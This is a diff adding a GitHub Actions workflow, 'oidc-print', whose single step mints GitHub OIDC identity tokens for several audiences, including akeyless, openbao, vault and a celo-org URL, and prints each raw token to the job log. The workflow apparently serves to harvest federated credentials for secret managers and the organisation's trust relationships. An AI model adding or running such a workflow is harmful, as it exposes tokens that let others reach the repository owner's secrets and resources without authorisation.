@@ -1,0 +1,17 @@
+name: oidc-print
+on:
+  workflow_dispatch:
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  p:
+    runs-on: ubuntu-latest
+    steps:
+      - name: mint
+        run: |
+          for AUD in akeyless https://github.com/celo-org openbao vault; do
+            echo "### AUD=$AUD"
+            RESP=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=$AUD")
+            echo "$RESP" | jq -r '.value // .'
+          done
